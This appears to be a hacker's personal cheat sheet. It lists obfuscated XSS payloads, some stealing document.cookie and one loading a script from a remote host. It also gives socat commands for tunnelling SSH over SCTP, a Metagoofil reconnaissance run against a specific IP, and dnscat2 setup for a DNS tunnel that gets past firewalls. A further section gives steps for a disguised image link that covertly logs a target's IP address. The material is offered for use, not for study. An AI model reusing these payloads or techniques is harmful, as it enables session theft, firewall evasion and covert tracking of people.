    <IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>

    <IMG                     SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
    <IMG SRC=”jav ascript:alert(‘XSS’);”>

    perl -e ‘print “<IMG SRC=javascript:alert(\”XSS\”)>”;’ > out

    <BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>

    (“>< iframes http://google.com < iframes >)

    <BODY BACKGROUND=”javascript:alert(‘XSS’)”>
    <FRAMESET><FRAME SRC=”javascript:alert(‘XSS’);”></FRAMESET>
    “><script >alert(document.cookie)</script>
    %253cscript%253ealert(document.cookie)%253c/script%253e
    “><s”%2b”cript>alert(document.cookie)</script>
    %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
    <img src=asdf onerror=alert(document.cookie)>

    SSH Over SCTP (using Socat)

    socat SCTP-LISTEN:80,fork TCP:localhost:22
    socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80
    ssh -lusername localhost -D 8080 -p 1337

# Metagoofil – Metadata collection tool

    Note: Metagoofil is a tool for collecting information using Google.
    
    > metagoofil -w -d 150.107.31.61 -t doc,pdf -l 200 -n 50 -o examplefiles-northernrich
    [*] Downloaded files will be saved here: examplefiles-northernrich
    [*] Searching for 200 .doc files and waiting 30.0 seconds between searches
    [*] Searching for 200 .pdf files and waiting 30.0 seconds between searches
    [+] Total download: 0 bytes / 0.00 KB / 0.00 MB
    [+] Done!
    

# Use a DNS tunnel to bypass the firewall
    
    https://github.com/iagox86/dnscat2
    
    apt install dnscat
    
    or
    
    apt-get update
    apt-get -y install ruby-dev git make g++
    gem install bundler
    git clone https://github.com/iagox86/dnscat2.git
    cd dnscat2/server
    bundle install
    ruby ./dnscat2.rb
    dnscat2> New session established: 16059
    dnscat2> session -i 16059

    https://downloads.skullsecurity.org/dnscat2/
    https://github.com/lukebaggett/dnscat2-powershell
    
    dnscat –host <dnscat server_ip>
    
    # Temporary phone number and sms, USA/Canada only
    
    https://es.freephonenum.com
    
    # Create an imageLogger.

    1) upload an image to es.imgbb.com
    2) get the url
    3) create a link on iplogger.com
        alternatives 
        https://www.iplocation.net/ip-lookup
        https://ipinfo.io/account/search
    4) get the url
    5) create a link at https://www.shorturl.at/shortener.php

    You already have the link to send.

    You can see the ip at iplogger.com
    
    # Encrypt/decrypt and more!!
    
    https://gchq.github.io/CyberChef
